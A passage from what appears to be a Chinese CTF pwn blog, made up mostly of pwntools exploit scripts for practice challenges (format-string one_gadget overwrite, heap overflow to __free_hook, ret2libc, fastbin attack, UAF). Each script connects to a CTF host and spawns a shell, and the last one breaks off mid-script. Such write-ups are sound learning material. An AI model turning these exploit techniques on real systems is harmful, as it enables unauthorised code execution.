class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> ctypes import*<br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=0<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./a&#x27;</span><br>context(<span class="hljs-attribute">log_level</span>=<span class="hljs-string">&#x27;debug&#x27;</span>,os=&#x27;linux&#x27;,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node5.anna.nssctf.cn&#x27;,28163)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><br><span class="hljs-attribute">libc</span>=ELF(&#x27;/home/lekc/pwntools/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;)<br><span class="hljs-attribute">llff</span>=CDLL(&#x27;./libc.so.6&#x27;)<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda c : u64(rc(c).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>gadget=[0xe3b2e,0xe3b31,0xe3b34]<br><span class="hljs-attribute">offset</span>=6<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>def attack(i):<br>llff.srand(0x6262626262626262)<br><span class="hljs-attribute">p1</span>=b&#x27;a&#x27;*0x100+b&#x27;b&#x27;*8<br>sla(b<span class="hljs-string">&#x27;Please input your name:&#x27;</span>,p1)<br>ru(<span class="hljs-string">&#x27;b&#x27;</span><span class="hljs-number">*8</span>)<br><span class="hljs-attribute">canary</span>=u64(rc(8))-0xa<br><span class="hljs-attribute">rbp</span>=u64(rc(6).ljust(8,b&#x27;\x00&#x27;))<br><span class="hljs-attribute">ret_main_0</span>=rbp-(0x260-0x178)<br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> range(100):<br>ru(<span class="hljs-string">&#x27;round&#x27;</span>)<br>sl(str(((llff.rand()+1)%3)))<br>sleep(0.5)<br>#<span class="hljs-attribute">p2</span>=str(&#x27;%&#x27;+str(i)+&#x27;$p%&#x27;+str(i+1)+&#x27;$p%&#x27;+str(i+2)+&#x27;$p%&#x27;+str(i+3)+&#x27;$p&#x27;)<br><span class="hljs-attribute">p2</span>=b&#x27;%62c%8$hhna%79$p&#x27;+p64(rbp-0x218)<br><span class="hljs-built_in">print</span>(len(p2))<br>sla(<span class="hljs-string">&quot;Good luck to you.&quot;</span>,p2)<br>ru(<span class="hljs-string">&#x27;0x&#x27;</span>)<br><span class="hljs-attribute">libc_main_243</span>=int(rc(12),16)<br><span class="hljs-attribute">libc_base</span>=libc_main_243-243-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><br><span class="hljs-attribute">one_gadget</span>=libc_base+gadget[1]<br><span class="hljs-attribute">p</span>=fmtstr_payload(6,&#123;rbp-0x218:one_gadget&#125;)<br>sla(<span class="hljs-string">&quot;Good luck to you.&quot;</span>,p)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc_main_243&quot;</span>,hex(libc_main_243))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ret_main_0&#x27;</span>,hex(ret_main_0))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;rbp&#x27;</span>,hex(rbp))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;canary&#x27;</span>,hex(canary))<br>io.interactive()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>attack(0)<br></code></pre></td></tr></table></figure><h2 id="长安杯-2021学生组-baige"><a href="#长安杯-2021学生组-baige" class="headerlink" title="[长安杯 2021学生组]baige"></a>[长安杯 2021学生组]baige</h2><p>利用add的漏洞使得我们在edit中可以修改的字节长度为任意</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>from LibcSearcher import*<br>from ctypes import*<br>from struct import*<br>io_ch=<span class="hljs-number">1</span><br>de_bug=<span class="hljs-number">1</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./a&#x27;</span><br><span class="hljs-built_in">context</span>(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28854</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda c : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(c).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) <br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">cmd</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">add</span>(idx,size,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;idx?&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;size?&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;content?&quot;</span>,data)<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;idx?&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">edit</span>(idx,size,data):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;idx?&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;size?&quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-built_in">sa</span>(<span class="hljs-string">&quot;content?&quot;</span>,data)<br>def <span class="hljs-built_in">show</span>(idx):<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;idx?&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>def <span class="hljs-built_in">exit</span>():<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">5</span>)<br># - - - - - - - - - - - - - #<br>#libc-<span class="hljs-number">2.27</span>-<span class="hljs-number">3</span>ubuntu1.<span class="hljs-number">4</span>_amd64<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">attack</span>():<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Now,Start!&#x27;</span>)<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):#<span class="hljs-number">0</span>-<span class="hljs-number">7</span><br><span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x88,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">8</span>,<span class="hljs-number">0</span>x10,<span class="hljs-string">&#x27;a&#x27;</span>)<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):#<span class="hljs-number">0</span>-<span class="hljs-number">7</span><br><span class="hljs-built_in">free</span>(i)<br>for i in <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br><span class="hljs-built_in">add</span>(i,<span class="hljs-number">0</span>x88,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;idx?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;size?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>x500))<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x90,b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x90)<br><span class="hljs-built_in">show</span>(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">ru</span>(b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x90)<br>main_arena=<span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">96</span><br>__malloc_hook=main_arena-<span class="hljs-number">0</span>x10<br>#libc=<span class="hljs-built_in">LibcSearcher</span>(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>,__malloc_hook)<br>#libc_base=__malloc_hook-libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>)<br>#free_hook=libc_base+libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;__free_hook&#x27;</span>)<br>#system=libc_base+libc.<span class="hljs-built_in">dump</span>(<span class="hljs-string">&#x27;system&#x27;</span>)<br>libc_base=__malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc_base+libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>p1=<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">17</span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x91)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>x90,p1)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">7</span>,<span class="hljs-number">0</span>x88,b<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">9</span>,<span class="hljs-number">0</span>x10,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">10</span>,<span class="hljs-number">0</span>x10,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">11</span>,<span class="hljs-number">0</span>x10,<span class="hljs-string">&#x27;a&#x27;</span>)<br><span class="hljs-built_in">cmd</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;idx?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">8</span>))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;size?&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>x500))<br><span class="hljs-built_in">free</span>(<span class="hljs-number">9</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">10</span>)<br>p2=<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x21)+<span class="hljs-built_in">p64</span>(free_hook)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">8</span>,<span class="hljs-number">0</span>x28,p2)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">12</span>,<span class="hljs-number">0</span>x10,<span class="hljs-built_in">p64</span>(system))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">13</span>,<span class="hljs-number">0</span>x10,<span class="hljs-built_in">p64</span>(system))<br><span class="hljs-built_in">add</span>(<span class="hljs-number">14</span>,<span class="hljs-number">0</span>x10,<span class="hljs-built_in">p64</span>(system))<br><span class="hljs-built_in">free</span>(<span class="hljs-number">7</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-built_in">hex</span>(system))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;__free_hook&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;__malloc_hook&quot;</span>,<span class="hljs-built_in">hex</span>(__malloc_hook))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc_base&#x27;</span>,<span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;main_arena&#x27;</span>,<span class="hljs-built_in">hex</span>(main_arena))<br>if __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br><span class="hljs-built_in">attack</span>()<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h1 id="末尾"><a href="#末尾" class="headerlink" title="末尾"></a>末尾</h1>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>nss</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>buu刷题记录</title>
    <link href="/2023/07/27/buu%E5%88%B7%E9%A2%98%C2%B7%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/07/27/buu%E5%88%B7%E9%A2%98%C2%B7%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h2 id="jarvisoj-level1"><a href="#jarvisoj-level1" class="headerlink" title="jarvisoj_level1"></a>jarvisoj_level1</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*-coding:utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn import*<br><span class="hljs-keyword">from</span> LibcSearcher import*<br><span class="hljs-attribute">io_ch</span>=1<br><span class="hljs-attribute">de_bug</span>=0<br><span class="hljs-attribute">arch</span>=<span class="hljs-string">&#x27;i386&#x27;</span><br><span class="hljs-attribute">filename</span>=<span class="hljs-string">&#x27;./level&#x27;</span><br>context(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,<span class="hljs-attribute">os</span>=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">io_ch</span>==1:<br><span class="hljs-attribute">io</span>=remote(&#x27;node4.buuoj.cn&#x27;,27863)<br><span class="hljs-keyword">else</span>:<br><span class="hljs-attribute">io</span>=process(filename)<br><span class="hljs-keyword">if</span> <span class="hljs-attribute">de_bug</span>==1:<br>gdb.attach(io)<br><span class="hljs-attribute">elf</span>=ELF(filename)<br><span class="hljs-comment">#libc=ELF(&#x27;&#x27;)</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br>s   = lambda content : io.send(content)<br>sl  = lambda content : io.sendline(content)<br>sa  = lambda content,send : io.sendafter(content, send)<br>sla = lambda content,send : io.sendlineafter(content, send)<br>rc  = lambda number : io.recv(number)<br>ru  = lambda content : io.recvuntil(content)<br>rcg = lambda : u64(rc(6).ljust(8, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><span class="hljs-attribute">vlun</span>=0x0804847B<br><span class="hljs-attribute">main</span>=0x080484B7<br><span class="hljs-attribute">write_plt</span>=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-attribute">write_got</span>=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><span class="hljs-comment"># - - - - - - - - - - - - - #</span><br><br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*140+p32(write_plt) + p32(main) +p32(0x1)+p32(write_got)+p32(0x4) <br>sl(p)<br><span class="hljs-attribute">write_addr</span>=u32(rc(4))<br><span class="hljs-built_in">print</span>(hex(write_addr))<br><span class="hljs-attribute">libc</span>=LibcSearcher(&#x27;write&#x27;,write_addr)<br><span class="hljs-attribute">libc_base</span>=write_addr-libc.dump(&#x27;write&#x27;)<br><span class="hljs-attribute">sys</span>=libc.dump(&#x27;system&#x27;)+libc_base<br><span class="hljs-attribute">bs</span>=libc.dump(&#x27;str_bin_sh&#x27;)+libc_base<br><span class="hljs-built_in">print</span>(hex(sys))<br><span class="hljs-built_in">print</span>(hex(bs))<br><span class="hljs-attribute">p</span>=b&#x27;a&#x27;*140+p32(sys) + p32(main) +p32(bs)<br>sl(p)<br>io.interactive()<br><br></code></pre></td></tr></table></figure><h2 id="hitcontraining-magicheap"><a href="#hitcontraining-magicheap" class="headerlink" title="hitcontraining_magicheap"></a>hitcontraining_magicheap</h2><p><strong>fastbin attack</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br><br>io_ch=<span class="hljs-number">0</span><br>de_bug=<span class="hljs-number">1</span><br>arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>filename=<span class="hljs-string">&#x27;./magicheap&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28772</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span class="hljs-number">1</span>:<br>gdb.<span class="hljs-built_in">attach</span>(io)<br>elf=<span class="hljs-built_in">ELF</span>(filename)<br>#libc=<span class="hljs-built_in">ELF</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br># - - - - - - - - - - - - - #<br>s   = lambda content : io.<span class="hljs-built_in">send</span>(content)<br>sl  = lambda content : io.<span class="hljs-built_in">sendline</span>(content)<br>sa  = lambda content,send : io.<span class="hljs-built_in">sendafter</span>(content, send)<br>sla = lambda content,send : io.<span class="hljs-built_in">sendlineafter</span>(content, send)<br>rc  = lambda number : io.<span class="hljs-built_in">recv</span>(number)<br>ru  = lambda content : io.<span class="hljs-built_in">recvuntil</span>(content)<br>rcg = lambda : <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">rc</span>(<span class="hljs-number">6</span>).<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>, b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br># - - - - - - - - - - - - - #<br>def <span class="hljs-built_in">choice</span>(c):<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-built_in">str</span>(c))<br>def <span class="hljs-built_in">add</span>(size,data):<br><span class="hljs-built_in">choice</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Size of Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Content of heap:&quot;</span>,data)<br>def <span class="hljs-built_in">edit</span>(idx,data):<br><span class="hljs-built_in">choice</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Size of Heap : &quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(data)))<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>,data)<br>def <span class="hljs-built_in">free</span>(idx):<br><span class="hljs-built_in">choice</span>(<span class="hljs-number">3</span>)<br><span class="hljs-built_in">sla</span>(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br># - - - - - - - - - - - - - #<br>magic_addr=<span class="hljs-number">0</span>x00000000006020A0<br>fake_chunk=<span class="hljs-number">0</span>x60208d<br># - - - - - - - - - - - - - #<br>p=b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">3</span>+<span class="hljs-built_in">p32</span>(<span class="hljs-number">0</span>xffff)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x68,b<span class="hljs-string">&#x27;aaaa&#x27;</span>)#<span class="hljs-number">0</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x68,b<span class="hljs-string">&#x27;bbbb&#x27;</span>)#<span class="hljs-number">1</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x68,b<span class="hljs-string">&#x27;cccc&#x27;</span>)#<span class="hljs-number">2</span><br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)<br>p1=b<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0</span>x68+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x71)+<span class="hljs-built_in">p64</span>(fake_chunk)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,p1)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x68,b<span class="hljs-string">&#x27;dddd&#x27;</span>)#<span class="hljs-number">3</span>-<span class="hljs-number">1</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x68,p)#<span class="hljs-number">4</span>-fake_chunk<br><span class="hljs-built_in">choice</span>(<span class="hljs-number">4869</span>)<br>io.<span class="hljs-built_in">interactive</span>()<br></code></pre></td></tr></table></figure><h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>简单的<strong>UAF</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs css">#!/usr/bin/env python3<br># -*-coding:utf-<span class="hljs-number">8</span> -*-<br>from pwn import*<br>from LibcSearcher import*<br>io_ch=<span class="hljs-number">0</span><br>de_bug=<span class="hljs-number">1</span><br>arch=<span class="hljs-string">&#x27;i386&#x27;</span><br>filename=<span class="hljs-string">&#x27;./cisc&#x27;</span><br><span class="hljs-built_in">context</span>(log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=arch)<br>if io_ch==<span class="hljs-number">1</span>:<br>io=<span class="hljs-built_in">remote</span>(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">28073</span>)<br>else:<br>io=<span class="hljs-built_in">process</span>(filename)<br>if de_bug==<span 